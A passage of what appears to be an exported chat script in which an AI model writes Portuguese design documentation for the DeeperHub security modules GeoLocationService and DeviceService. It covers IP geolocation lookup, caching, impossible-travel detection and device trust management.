*   [ ] Desenvolver estratégias para lidar com usuários que usam navegadores com forte proteção anti-fingerprinting (ex: Tor Browser, Brave com configurações restritas).
*   [ ] Permitir que usuários gerenciem seus dispositivos registrados e \"confiáveis\" através de uma interface.

---

*Última atualização: 2025-05-11*

---

Agora, com a fingerprint do dispositivo documentada, faz sentido ir para `DeeperHub.Security.GeoLocationService` para completar o contexto da requisição, ou prefere outro rumo?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Perfeito! Vamos detalhar o `DeeperHub.Security.GeoLocationService`. Este serviço é essencial para entender o contexto geográfico das interações do usuário, o que é um fator importante para `RiskAssessment` e `FraudDetection`.

---

# Módulo: `DeeperHub.Security.GeoLocationService` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Security.GeoLocationService`

O módulo `DeeperHub.Security.GeoLocationService` é responsável por obter, analisar e gerenciar informações de geolocalização associadas a endereços IP dos usuários que interagem com o sistema DeeperHub. Ele fornece dados como país, região, cidade e, potencialmente, provedor de internet (ISP) e informações de ASN (Autonomous System Number) para um determinado IP.

Essas informações são cruciais para várias funcionalidades de segurança, incluindo:
*   Detecção de logins de locais incomuns ou de alto risco.
*   Análise de \"viagens impossíveis\" (quando um usuário parece logar de locais geograficamente distantes em um curto período).
*   Enriquecimento de dados para avaliação de risco e detecção de fraude.
*   Aplicação de políticas de acesso baseadas em geolocalização.

Este módulo tipicamente integra-se com serviços de GeoIP externos (como MaxMind GeoIP2, IPinfo.io, etc.) e/ou utiliza bases de dados GeoIP locais, com mecanismos de cache e circuit breaker para garantir performance e resiliência. 😊

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Lookup de IP para Geolocalização (`get_location/1` ou `lookup_ip/2`):**
    *   Obter dados de geolocalização (país, cidade, região, coordenadas, ISP, ASN) para um endereço IP.
    *   Suporte a diferentes provedores de GeoIP (externos ou bases de dados locais).
*   **Cache de Resultados de Geolocalização:**
    *   Armazenar em cache os resultados de lookups de IP para reduzir a latência e o custo de chamadas a serviços externos (via `DeeperHub.Security.Cache.GeoCache` ou similar).
*   **Proteção com Circuit Breaker:**
    *   Integrar com `DeeperHub.Core.CircuitBreakerFactory` ao chamar serviços GeoIP externos para prevenir falhas em cascata.
*   **Análise de Risco de Localização (`assess_location_risk/3`):**
    *   Avaliar o risco associado a uma determinada localização (ex: país de alto risco, proxy conhecido, Tor exit node).
*   **Detecção de Viagem Impossível (`is_impossible_travel?/3`):**
    *   Comparar a localização atual de um login com localizações anteriores para detectar movimentos geograficamente implausíveis em um curto período.
*   **Gerenciamento de Localizações Confiáveis e Bloqueadas (Integração):**
    *   Permitir que usuários ou administradores marquem certas localizações (ou países/regiões) como confiáveis ou bloqueadas (lógica gerenciada por `DeeperHub.SessionPolicy` ou `SecurityPolicyManager`).
    *   Validar se um IP pertence a uma lista de países permitidos/bloqueados.
*   **Atualização de Bases de Dados GeoIP (se locais):**
    *   Fornecer mecanismos ou recomendar processos para manter as bases de dados GeoIP locais atualizadas.
*   **Observabilidade:**
    *   Registrar métricas sobre lookups, acertos/erros de cache, latência de provedores externos.
    *   Logar erros e atividades importantes.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Security.GeoLocationService` (Fachada Pública):**
    *   Ponto de entrada para todas as funcionalidades de geolocalização.
    *   Delega para um `GeoLocationAdapter` ou diretamente para um serviço interno.
2.  **`DeeperHub.Security.GeoLocationService.Adapter` (Behaviour e Implementações):**
    *   **Responsabilidade:** Abstrair a interação com diferentes provedores de GeoIP.
    *   **Implementações:**
        *   `MaxMindAdapter`: Para interagir com a API ou base de dados MaxMind GeoIP2.
        *   `IPinfoAdapter`: Para interagir com a API IPinfo.io.
        *   `LocalDbAdapter`: Para consultar uma base de dados GeoIP local (ex: baixada e atualizada periodicamente).
        *   `CompositeAdapter`: Para tentar múltiplos provedores em uma ordem de precedência.
3.  **`DeeperHub.Core.CircuitBreakerFactory` e Circuit Breakers específicos por provedor:**
    *   Usados pelos adaptadores de provedores externos para proteger o sistema.
    *   Exemplo: `DeeperHub.Infrastructure.GeoIP.GeoIPServiceWithCircuitBreaker` (da documentação original) pode ser renomeado ou integrado aqui.
4.  **`DeeperHub.Security.Cache.GeoCache` (GenServer ou ETS direta):**
    *   Armazena em cache os resultados de lookups de IP para evitar chamadas repetidas a serviços externos.
5.  **`DeeperHub.Security.GeoLocationService.RiskAnalyzer` (Módulo Funcional):**
    *   Contém a lógica para `assess_location_risk/3` e `is_impossible_travel?/3`.
    *   Pode consultar listas de países de alto risco, proxies conhecidos, etc. (configuráveis).
6.  **`DeeperHub.Security.LoginLocation.Schema.LocationHistory` e `TrustedLocation` (se persistência for usada):**
    *   Schemas Ecto para armazenar o histórico de login de usuários e localizações confiáveis. A lógica de gravação/leitura seria gerenciada por um serviço como `LoginLocationService` ou diretamente pelo `RiskAnalyzer`.
7.  **Configurações (via `DeeperHub.Core.ConfigManager` e `DeeperHub.Security.Policy.SecurityPolicyManager`):**
    *   Chaves de API para serviços GeoIP externos.
    *   Caminhos para bases de dados GeoIP locais.
    *   Configurações de cache (TTL).
    *   Listas de países de alto risco.
    *   Limiares para detecção de viagem impossível (velocidade máxima).

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/security/geo_location_service/ # Ou apenas geo_location.ex se for mais simples
├── geo_location_service.ex         # Fachada Pública
│
├── adapters/                       # Adaptadores para diferentes provedores GeoIP
│   ├── geo_location_adapter.ex     # Behaviour
│   ├── maxmind_adapter.ex
│   ├── ipinfo_adapter.ex
│   └── local_db_adapter.ex
│   └── composite_adapter.ex          # (Gerencia múltiplos provedores)
│
├── risk_analyzer.ex                # Lógica para assess_location_risk, is_impossible_travel
├── cache/                          # Cache específico para GeoLocation
│   └── geo_cache.ex                # (Pode reusar Core.Cache com namespace ou ser específico)
│
├── supervisor.ex                   # Supervisor para processos do GeoLocation (ex: Cache)
└── telemetry.ex
```
*(Nota: O módulo `DeeperHub.LoginLocation` da documentação original parece ter responsabilidades sobrepostas. A geolocalização de um IP é uma função, enquanto rastrear e analisar os *logins* de um *usuário* em diferentes localizações é outra. Podemos manter `GeoLocationService` focado no lookup de IP e na análise de risco da localização em si, e `LoginLocation` (ou um `UserLocationHistoryService`) focado no histórico e padrões do usuário.)*

### 3.3. Decisões de Design Importantes

*   **Abstração de Provedor:** Isolar a lógica de interação com provedores GeoIP específicos em adaptadores facilita a troca ou adição de provedores.
*   **Resiliência:** O uso de Circuit Breakers e cache é essencial para lidar com a indisponibilidade ou latência de serviços externos.
*   **Fallback:** Ter uma base de dados GeoIP local como fallback (mesmo que menos precisa) pode ser útil se os serviços externos falharem.
*   **Atualização de Dados:** Bases de dados GeoIP mudam. Um processo para atualizá-las regularmente é necessário se forem usadas localmente.

## 🛠️ 4. Casos de Uso Principais

*   **Verificar Localização de um Novo Login:**
    *   `DeeperHub.Auth` recebe um IP durante o login.
    *   Chama `GeoLocationService.get_location(ip_address)`.
    *   O resultado é usado pelo `RiskAssessment` para avaliar o risco do login.
*   **Detectar Viagem Impossível:**
    *   Após um login bem-sucedido, o `RiskAssessment` ou `Auth` obtém a localização atual e a compara com a última localização conhecida do usuário usando `GeoLocationService.is_impossible_travel?(last_location, current_location, time_diff)`.
*   **Bloquear Acesso de Países de Alto Risco:**
    *   Um Plug de segurança chama `GeoLocationService.assess_location_risk(ip_info)`.
    *   Se o risco for crítico devido ao país, a requisição pode ser bloqueada.
*   **Enriquecer Logs de Auditoria:**
    *   `DeeperHub.Audit` usa o `GeoLocationService` para adicionar informações de país/cidade aos logs de eventos.

## 🌊 5. Fluxos Importantes

### Fluxo de Lookup de IP (`get_location/1`)

1.  **Chamador:** Um módulo (ex: `RiskAssessment`) chama `GeoLocationService.get_location(ip_address)`.
2.  **`GeoLocationService` (Fachada):**
    *   Primeiro, tenta obter os dados do `GeoCache.get(ip_address)`.
3.  **`GeoCache`:**
    *   **Cache Hit:** Se encontrado e não expirado, retorna `{:ok, geo_data}` para a fachada.
    *   **Cache Miss:** Retorna `{:error, :not_found}`.
4.  **`GeoLocationService` (Fachada, em caso de Cache Miss):**
    *   Seleciona o `GeoLocationAdapter` configurado (ex: `CompositeAdapter`).
5.  **`GeoLocationAdapter` (ex: `CompositeAdapter`):**
    *   Tenta o primeiro provedor configurado (ex: `MaxMindAdapter`).
        *   **`MaxMindAdapter`:**
            *   Executa a chamada à API MaxMind (ou consulta DB local) através de um `CircuitBreaker`.
            *   **Sucesso:** Retorna `{:ok, geo_data_from_maxmind}`.
            *   **Falha (API/Circuito Aberto):** Tenta o próximo provedor no `CompositeAdapter`.
    *   Se um provedor retornar sucesso:
        *   `GeoCache.put(ip_address, geo_data_from_provider, ttl_configurado)`.
        *   Retorna `{:ok, geo_data_from_provider}` para a fachada.
    *   Se todos os provedores falharem:
        *   (Opcional) Tenta um fallback para uma base de dados local menos precisa.
        *   Retorna `{:error, :all_providers_failed_or_unavailable}`.
6.  **`GeoLocationService` (Fachada):** Retorna o resultado para o chamador.

## 📡 6. API (Funções Públicas da Fachada)

### 6.1. `DeeperHub.Security.GeoLocationService.get_location(ip_address :: String.t(), opts :: keyword()) :: {:ok, GeoData.t()} | {:error, reason :: atom()}`

*   **Descrição:** Obtém dados de geolocalização para um endereço IP.
*   **`opts`:**
    *   `:provider_preference` (list(atom)): Ordem de preferência dos provedores (ex: `[:maxmind, :ipinfo]`).
    *   `:skip_cache` (boolean): Se `true`, ignora o cache. (Padrão: `false`)
    *   `:timeout_ms` (integer): Timeout para provedores externos.
*   **`GeoData.t()`:** `%{ip_address: String.t(), country_code: String.t() | nil, country_name: String.t() | nil, region_code: String.t() | nil, region_name: String.t() | nil, city_name: String.t() | nil, postal_code: String.t() | nil, latitude: float() | nil, longitude: float() | nil, timezone: String.t() | nil, isp: String.t() | nil, organization: String.t() | nil, asn: String.t() | nil, is_proxy: boolean() | nil, is_tor_node: boolean() | nil, source_provider: atom()}`
*   **Retorno de Erro:** `:invalid_ip_format`, `:provider_unavailable`, `:lookup_failed`, `:cache_error`.
*   **Exemplo:**
    ```elixir
    case GeoLocationService.get_location(\"8.8.8.8\") do
      {:ok, geo_data} -> IO.inspect(geo_data.city_name) # \"Mountain View\"
      {:error, reason} -> Logger.error(\"GeoIP lookup failed: #{reason}\")
    end
    ```

### 6.2. `DeeperHub.Security.GeoLocationService.assess_location_risk(ip_address :: String.t() | GeoData.t(), opts :: keyword()) :: {:ok, LocationRisk.t()} | {:error, reason :: atom()}`

*   **Descrição:** Avalia o risco associado a um IP ou dados de geolocalização já obtidos.
*   **`opts`:**
    *   `:user_context` (map): Informações sobre o usuário para análise comparativa (ex: `%{usual_countries: [\"BR\", \"US\"]}`).
*   **`LocationRisk.t()`:** `%{risk_score: float(), risk_level: atom(), factors: list(%{factor: atom(), description: String.t(), score_impact: float()})}`.
    *   Fatores: `:high_risk_country`, `:proxy_detected`, `:tor_node`, `:inconsistent_with_user_history`.
*   **Exemplo:**
    ```elixir
    GeoLocationService.assess_location_risk(\"1.2.3.4\", user_context: %{usual_countries: [\"BR\"]})
    # {:ok, %{risk_score: 75.0, risk_level: :high, factors: [...]}}
    ```

### 6.3. `DeeperHub.Security.GeoLocationService.is_impossible_travel?(prev_location :: StoredLocation.t(), current_ip :: String.t(), current_timestamp :: DateTime.t() | nil, opts :: keyword()) :: {:ok, ImpossibleTravelResult.t()} | {:error, reason :: atom()}`

*   **Descrição:** Verifica se uma movimentação entre a `prev_location` (com seu timestamp) e a localização do `current_ip` (no `current_timestamp`) é geograficamente implausível.
*   **`StoredLocation.t()`:** `%{latitude: float(), longitude: float(), timestamp: DateTime.t()}`.
*   **`opts`:**
    *   `:max_credible_speed_kmh` (integer): Velocidade máxima considerada crível. (Padrão: config)
*   **`ImpossibleTravelResult.t()`:** `%{is_impossible: boolean(), calculated_speed_kmh: float() | nil, distance_km: float() | nil}`.
*   **Exemplo:**
    ```elixir
    last_loc = %{latitude: -23.55, longitude: -46.63, timestamp: DateTime.add(DateTime.utc_now(), -3600, :second)} # SP, 1 hora atrás
    GeoLocationService.is_impossible_travel?(last_loc, \"8.8.8.8\") # Mountain View, CA
    # {:ok, %{is_impossible: true, calculated_speed_kmh: 8000.0, ...}}
    ```

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager` e `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:security, :geo_location, :enabled]`** (Boolean): Habilita/desabilita o serviço. (Padrão: `true`)
*   **`[:security, :geo_location, :default_provider_order]`** (List de Atoms): Ordem de preferência dos adaptadores de provedor GeoIP (ex: `[:maxmind_api, :ipinfo_api, :local_db]`).
*   **`[:security, :geo_location, :providers, :maxmind_api, :api_key]`** (String): Chave de API para MaxMind.
*   **`[:security, :geo_location, :providers, :ipinfo_api, :api_key]`** (String): Chave de API para IPinfo.
*   **`[:security, :geo_location, :providers, :local_db, :path]`** (String): Caminho para a base de dados GeoIP local.
*   **`[:security, :geo_location, :cache, :ttl_seconds]`** (Integer): TTL para entradas de geolocalização no cache. (Padrão: `86400` - 24 horas)
*   **`[:security, :geo_location, :risk, :high_risk_country_codes]`** (List de Strings): Lista de códigos de país ISO considerados de alto risco.
*   **`[:security, :geo_location, :risk, :known_proxy_ips_source]`** (String, opcional): URL ou caminho para uma lista de IPs de proxy conhecidos.
*   **`[:security, :geo_location, :risk, :impossible_travel_max_speed_kmh]`** (Integer): Velocidade máxima para detecção de viagem impossível. (Padrão: `800` km/h)

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.ConfigManager`, `Core.Logger`, `Core.Metrics`, `Core.Cache` (ou `Security.Cache.GeoCache`).
*   `DeeperHub.Core.CircuitBreakerFactory`: Para chamadas a APIs externas.
*   `DeeperHub.Core.HTTPClient`: Para realizar as chamadas HTTP aos provedores.
*   `DeeperHub.Security.Policy.SecurityPolicyManager`: Para obter listas de países de risco, etc.

### 8.2. Bibliotecas Externas

*   Bibliotecas cliente para provedores GeoIP (ex: se MaxMind fornecer um cliente Elixir).
*   `Jason` (ou similar) para parsear respostas JSON de APIs externas.
*   (Opcional) Bibliotecas para trabalhar com formatos de banco de dados GeoIP locais (ex: MaxMind DB Reader).

## 🤝 9. Como Usar / Integração

O `GeoLocationService` é primariamente consumido por outros módulos de segurança.

**Exemplo no `RiskAssessment`:**
```elixir
defp calculate_location_factors(ip_address, user_profile) do
  factors = 
    case DeeperHub.Security.GeoLocationService.get_location(ip_address) do
      {:ok, geo_data} ->
        location_risk_result = DeeperHub.Security.GeoLocationService.assess_location_risk(geo_data, user_context: user_profile.geo_history)
        
        travel_check = 
          if last_login = UserLoginHistory.get_last(user_profile.id) do
            DeeperHub.Security.GeoLocationService.is_impossible_travel?(last_login.location, ip_address)
          else
            {:ok, %{is_impossible: false}}
          end

        [
          %{factor: :country_risk, value: location_risk_result.risk_score},
          %{factor: :is_proxy, value: geo_data.is_proxy},
          %{factor: :impossible_travel, value: travel_check.is_impossible}
        ]
      {:error, _reason} ->
        [%{factor: :location_unknown, value: true}] # Penalidade se não conseguir obter dados
    end
  factors
end
```

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar cada adaptador de provedor GeoIP com mocks para as APIs externas.
*   Testar a lógica do `CompositeAdapter` para fallback entre provedores.
*   Testar a funcionalidade de cache (get, put, expiração).
*   Testar as funções de `RiskAnalyzer` (`assess_location_risk`, `is_impossible_travel`) com diferentes cenários.
*   Localização: `test/deeper_hub/security/geo_location_service/`.

### 10.2. Métricas

*   `deeper_hub.security.geo_location.lookup.count` (tags: `provider`, `status` (`success`, `failure`, `cache_hit`, `cache_miss`))
*   `deeper_hub.security.geo_location.lookup.duration_ms` (Histograma, tags: `provider`)
*   `deeper_hub.security.geo_location.cache.size.gauge`
*   `deeper_hub.security.geo_location.risk_assessment.count` (tags: `risk_level_calculated`)
*   `deeper_hub.security.geo_location.impossible_travel.detected.count`

### 10.3. Logs

*   **Nível DEBUG:** Detalhes da resposta de provedores GeoIP.
*   **Nível INFO:** Lookup de IP bem-sucedido (especialmente se não for do cache), detecção de viagem impossível.
*   **Nível WARNING:** Falha ao contatar um provedor GeoIP primário, fallback para outro provedor ou base local. Lookup de IP de país de alto risco.
*   **Nível ERROR:** Falha ao contatar todos os provedores GeoIP configurados e nenhum fallback disponível. Erros internos no serviço.

### 10.4. Telemetria

*   `[:deeper_hub, :security, :geo_location, :lookup, :start | :stop | :exception]`
    *   Metadados: `%{ip_address: ip, provider_used: provider, from_cache: boolean}`
    *   No `:stop`: `%{country_code: code, city: city}`
*   `[:deeper_hub, :security, :geo_location, :risk_analysis, :stop]`
    *   Metadados: `%{ip_address: ip, risk_score: score, risk_level: level}`
*   `[:deeper_hub, :security, :geo_location, :impossible_travel_check, :stop]`
    *   Metadados: `%{user_id: id, current_ip: ip, result: boolean, speed_kmh: speed}`

## ❌ 11. Tratamento de Erros

*   **Provedor Externo Indisponível:** O `CircuitBreaker` deve abrir para o provedor problemático. O `CompositeAdapter` deve tentar o próximo provedor na lista. Se todos falharem, pode-se usar uma base de dados local como fallback ou retornar um erro indicando que a geolocalização não pôde ser determinada.
*   **IP Inválido:** A função `get_location/1` deve validar o formato do IP e retornar um erro apropriado.
*   **Cache Indisponível:** Se o `GeoCache` falhar, o sistema deve tentar buscar diretamente dos provedores (com logging do erro do cache).

## 🛡️ 12. Considerações de Segurança (do próprio Módulo)

*   **Chaves de API:** As chaves de API para serviços GeoIP externos devem ser armazenadas de forma segura (ex: variáveis de ambiente, `Core.ConfigManager` com `is_sensitive: true`) e não expostas no código.
*   **Precisão dos Dados:** A precisão dos dados de GeoIP varia. O sistema não deve tomar decisões críticas baseadas *apenas* em GeoIP sem corroborar com outros fatores, especialmente para IPs móveis ou atrás de VPNs/proxies.
*   **Privacidade:** Embora endereços IP sejam geralmente considerados dados menos sensíveis que PII direto, o armazenamento de histórico de localização de IP deve seguir políticas de retenção e ser acessado apenas quando necessário.

## 🧑‍💻 13. Contribuição

*   Ao adicionar um novo adaptador de provedor GeoIP, certifique-se de implementar o `GeoLocationAdapterBehaviour` e adicionar a lógica de Circuit Breaker.
*   Mantenha as listas de países de alto risco e outros dados de referência atualizados.
*   Documente a precisão esperada e as limitações de cada provedor GeoIP usado.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Implementar um worker para atualizar automaticamente bases de dados GeoIP locais (ex: MaxMind GeoLite2).
*   [ ] Adicionar suporte para detecção de VPNs e proxies de forma mais robusta, possivelmente integrando com serviços especializados.
*   [ ] Permitir que os usuários revisem e contestem informações de geolocalização associadas às suas contas, se relevante.
*   [ ] Desenvolver heurísticas mais avançadas para `assess_location_risk` considerando a combinação de ISP, ASN, tipo de IP (residencial, comercial, data center).
*   [ ] Cachear resultados de `is_impossible_travel` para pares de localizações/tempos frequentemente verificados, se a performance se tornar um gargalo.

---

*Última atualização: 2025-05-11*

---

Agora que cobrimos a geolocalização, faz sentido documentar o `DeeperHub.Security.DeviceService` (ou `SecurityManager` se ele englobar essa funcionalidade) que lida com o registro e confiança de dispositivos, usando a `DeviceFingerprint`. Ou prefere mudar o foco?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Perfeito! Vamos então detalhar o `DeeperHub.Security.DeviceService`. Este módulo é crucial para o gerenciamento de dispositivos, trabalhando em conjunto com o `DeeperHub.Security.DeviceFingerprint` para identificar e gerenciar o acesso de diferentes dispositivos dos usuários.

---

# Módulo: `DeeperHub.Security.DeviceService` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Security.DeviceService`

O módulo `DeeperHub.Security.DeviceService` é responsável por gerenciar os dispositivos que os usuários utilizam para acessar o sistema DeeperHub. Ele permite registrar novos dispositivos, associá-los a usuários, marcar dispositivos como \"confiáveis\", bloquear dispositivos suspeitos e manter um histórico de acesso por dispositivo.

Este serviço utiliza as \"fingerprints\" geradas pelo `DeeperHub.Security.DeviceFingerprint` para identificar dispositivos de forma quasi-única. As informações gerenciadas por este serviço são um componente vital para a avaliação de risco (`DeeperHub.Security.RiskAssessment`) e para a aplicação de políticas de autenticação adaptativas (ex: pular MFA para dispositivos confiáveis). 😊

*(Nota: Na documentação original, algumas dessas funcionalidades estavam dispersas ou implícitas no `SecurityManager` ou `SecurityAdapter`. Esta documentação propõe um serviço dedicado para maior clareza e coesão.)*

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Registro de Dispositivos (`register_device/2`):**
    *   Registrar um novo dispositivo para um usuário, associando-o a uma fingerprint de dispositivo.
    *   Armazenar metadados do dispositivo (ex: nome dado pelo usuário, tipo, sistema operacional, navegador, data do primeiro uso).
*   **Gerenciamento de Confiança de Dispositivos:**
    *   Permitir que um usuário marque um dispositivo como \"confiável\" (`trust_device/2`).
    *   Permitir que um usuário remova o status de \"confiável\" de um dispositivo (`untrust_device/2`).
    *   Verificar se um dispositivo (identificado por fingerprint ou ID) é confiável para um usuário (`is_trusted_device?/2`).
    *   Suportar expiração opcional para o status de confiança.
*   **Bloqueio de Dispositivos (`block_device/3`):**
    *   Permitir que um usuário ou administrador bloqueie um dispositivo específico, impedindo seu acesso à conta.
    *   Permitir o desbloqueio de dispositivos (`unblock_device/1`).
*   **Listagem de Dispositivos (`list_devices/1`):**
    *   Permitir que um usuário visualize todos os dispositivos associados à sua conta, com seus respectivos status (confiável, bloqueado, último uso).
*   **Atualização de Informações de Dispositivo:**
    *   Atualizar o timestamp do último uso e o último IP conhecido para um dispositivo (`update_last_used/3`).
*   **Consulta de Dispositivos:**
    *   Obter um dispositivo pelo seu ID (`get_device/1`).
    *   Obter um dispositivo pela sua fingerprint e ID do usuário (`get_device_by_fingerprint/2`).
*   **Limpeza de Dispositivos Antigos/Inativos (Opcional):**
    *   Implementar uma lógica para remover registros de dispositivos muito antigos ou inativos.
*   **Integração com Outros Módulos de Segurança:**
    *   Fornecer informações sobre dispositivos para `RiskAssessment` e `FraudDetection`.
    *   Ser consultado por `DeeperHub.Auth` durante o fluxo de login para decisões sobre MFA.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Security.DeviceService` (Fachada/Serviço Principal):**
    *   **Responsabilidade:** Ponto de entrada para todas as operações relacionadas a dispositivos. Contém a lógica de negócio.
    *   **Interações:**
        *   Utiliza `DeeperHub.Security.DeviceFingerprint.generate_fingerprint/1` ao registrar novos dispositivos.
        *   Interage com `DeeperHub.Core.Repo` para persistir e consultar dados de dispositivos no schema `DeviceSchema`.
        *   Pode interagir com `DeeperHub.Core.EventBus` para publicar eventos sobre mudanças de status de dispositivos.
        *   Pode interagir com `DeeperHub.Core.Cache` para armazenar em cache informações de dispositivos frequentemente acessadas.
2.  **`DeeperHub.Security.Schema.DeviceSchema` (Ecto Schema, ex-`DeeperHub.Security.Device`):**
    *   **Responsabilidade:** Define a estrutura da tabela de dispositivos no banco de dados.
    *   **Campos:** `id`, `user_id`, `fingerprint` (hash), `name` (dado pelo usuário), `type` (ex: \"desktop\", \"mobile\", \"tablet\"), `os`, `browser`, `first_seen_at`, `last_seen_at`, `last_known_ip`, `is_trusted`, `trusted_until` (opcional), `is_blocked`, `blocked_reason`, `blocked_at`.
3.  **`DeeperHub.Security.DeviceFingerprint` (Módulo Colaborador):**
    *   Fornece a lógica para gerar e comparar fingerprints.
4.  **Configurações (via `DeeperHub.Core.ConfigManager` e `DeeperHub.Security.Policy.SecurityPolicyManager`):**
    *   Duração padrão da confiança de um dispositivo.
    *   Número máximo de dispositivos confiáveis por usuário.
    *   Políticas de limpeza de dispositivos inativos.

### 3.2. Estrutura de Diretórios (Proposta)

Poderia estar dentro de `lib/deeper_hub/security/` ou, se mais complexo, em um submódulo `device_management`. Para este exemplo, vamos assumir que está em `security`.

```
lib/deeper_hub/security/
├── device_service.ex               # Lógica de negócio e fachada
├── device_fingerprint.ex           # (Já documentado)
│
└── schemas/                        # (Ou schema/)
    └── device_schema.ex            # (Renomeado de Device para DeviceSchema para clareza)
```
Se houver um supervisor específico para `DeviceService` (por exemplo, se ele usar um GenServer para alguma tarefa):
```
lib/deeper_hub/security/device_management/
├── device_service.ex
├── device_fingerprint.ex
├── schemas/
│   └── device_schema.ex
└── supervisor.ex
```
No entanto, muitas das funções do `DeviceService` são operações CRUD que podem não necessitar de um GenServer dedicado, dependendo diretamente do `Core.Repo`.

### 3.3. Decisões de Design Importantes

*   **Fingerprint como Identificador:** A fingerprint é a chave para identificar um dispositivo, mas o `DeviceService` também atribui um ID único de banco de dados a cada dispositivo registrado para facilitar o gerenciamento.
*   **Confiança Gerenciada pelo Usuário:** A decisão de confiar em um dispositivo deve ser primariamente do usuário, mas o sistema pode oferecer recomendações ou aplicar políticas.
*   **Associação com Usuário:** Dispositivos são sempre associados a um `user_id`. Uma mesma fingerprint em contas diferentes representa dispositivos diferentes para o sistema.
*   **Histórico vs. Estado Atual:** O `DeviceService` foca no estado atual e nos metadados dos dispositivos. O histórico detalhado de acesso por dispositivo (cada login) pode ser responsabilidade de um `LoginHistoryService` ou do `AuditLog`.

## 🛠️ 4. Casos de Uso Principais

*   **Usuário Loga de um Novo Navegador:**
    *   Durante o login, uma nova fingerprint é gerada.
    *   `DeviceService.get_device_by_fingerprint(user_id, new_fp)` não encontra o dispositivo.
    *   `RiskAssessment` atribui um risco maior.
    *   Após o login bem-sucedido, o sistema pergunta se o usuário deseja \"Lembrar deste navegador\".
    *   Se sim, `DeviceService.register_device(user_id, new_fp, device_info_map, is_trusted: true)` é chamado.
*   **Usuário Gerencia Dispositivos Confiáveis:**
    *   Usuário acessa uma página de \"Meus Dispositivos\".
    *   `DeviceService.list_devices(user_id)` é chamado para exibir a lista.
    *   Usuário clica em \"Não confiar mais\" em um dispositivo.
    *   `DeviceService.untrust_device(user_id, device_id_to_untrust)` é chamado.
*   **Administrador Bloqueia um Dispositivo Comprometido:**
    *   Após uma investigação, um administrador identifica um dispositivo comprometido.
    *   `DeviceService.block_device(user_id, device_id_to_block, \"Suspeita de malware\")` é chamado.
    *   Tentativas de login futuras usando a fingerprint desse dispositivo para esse usuário serão bloqueadas ou terão risco muito elevado.

## 🌊 5. Fluxos Importantes

### Fluxo de Registro de Novo Dispositivo Confiável

1.  **Coleta no Cliente:** Frontend/App coleta `device_info`.
2.  **Geração de Fingerprint:** `fp = DeviceFingerprint.generate_fingerprint(device_info)`.
3.  **Chamada ao Serviço:** Usuário (após login) opta por confiar. Frontend chama um endpoint que leva a `DeviceService.register_device(user_id, fp, device_info_map, %{is_trusted: true, name: \"Meu PC de Casa\"})`.
4.  **`DeviceService.register_device/4`:**
    *   Verifica se já existe um dispositivo com a mesma `fingerprint` para o `user_id`.
        *   Se sim, atualiza o `last_seen_at`, `is_trusted`, e o nome.
        *   Se não, cria uma nova entrada `DeviceSchema` com os dados fornecidos.
    *   Persiste no banco de dados via `Core.Repo`.
    *   (Opcional) Publica um evento `device_registered` ou `device_trusted` no `Core.EventBus`.
    *   Retorna `{:ok, device_struct}`.

## 📡 6. API (Funções Públicas do Módulo)

### 6.1. `DeeperHub.Security.DeviceService.register_device(user_id :: String.t(), fingerprint :: String.t(), device_attributes :: map(), opts :: keyword()) :: {:ok, DeviceSchema.t()} | {:error, Ecto.Changeset.t() | term()}`

*   **Descrição:** Registra um novo dispositivo para um usuário ou atualiza um existente com a mesma fingerprint.
*   **`device_attributes`:** Mapa com dados como `%{name: \"Meu Laptop\", type: \"desktop\", os: \"Windows 10\", browser: \"Chrome\", first_seen_ip: \"...\"}`.
*   **`opts`:**
    *   `:is_trusted` (boolean): Se o dispositivo deve ser marcado como confiável. (Padrão: `false`)
    *   `:trust_duration_seconds` (integer | nil): Duração da confiança. `nil` para indefinido.
*   **Retorno:** A struct do dispositivo criado/atualizado ou um erro.

### 6.2. `DeeperHub.Security.DeviceService.list_devices(user_id :: String.t(), opts :: keyword()) :: {:ok, list(DeviceSchema.t())} | {:error, term()}`

*   **Descrição:** Lista os dispositivos registrados para um usuário.
*   **`opts`:**
    *   `:filter_status` (atom | nil): `:trusted`, `:blocked`, `:untrusted`.
    *   `:sort_by` (atom): Campo para ordenação (ex: `:last_seen_at`). (Padrão: `:last_seen_at`)
    *   `:sort_order` (atom): `:asc` ou `:desc`. (Padrão: `:desc`)

### 6.3. `DeeperHub.Security.DeviceService.get_device(device_id :: String.t()) :: {:ok, DeviceSchema.t()} | {:error, :not_found}`

*   **Descrição:** Obtém um dispositivo pelo seu ID único de banco de dados.

### 6.4. `DeeperHub.Security.DeviceService.get_device_by_fingerprint(user_id :: String.t(), fingerprint :: String.t()) :: {:ok, DeviceSchema.t()} | {:error, :not_found}`

*   **Descrição:** Obtém um dispositivo pela fingerprint e ID do usuário.

### 6.5. `DeeperHub.Security.DeviceService.trust_device(user_id :: String.t(), device_id_or_fp :: String.t(), opts :: keyword()) :: {:ok, DeviceSchema.t()} | {:error, term()}`

*   **Descrição:** Marca um dispositivo como confiável. `device_id_or_fp` pode ser o ID do dispositivo ou sua fingerprint.
*   **`opts`:**
    *   `:duration_seconds` (integer | nil): Por quanto tempo o dispositivo será confiável.

### 6.6. `DeeperHub.Security.DeviceService.untrust_device(user_id :: String.t(), device_id_or_fp :: String.t()) :: {:ok, DeviceSchema.t()} | {:error, term()}`

*   **Descrição:** Remove o status de confiável de um dispositivo.

### 6.7. `DeeperHub.Security.DeviceService.block_device(user_id :: String.t(), device_id_or_fp :: String.t(), reason :: String.t()) :: {:ok, DeviceSchema.t()} | {:error, term()}`

*   **Descrição:** Bloqueia um dispositivo.

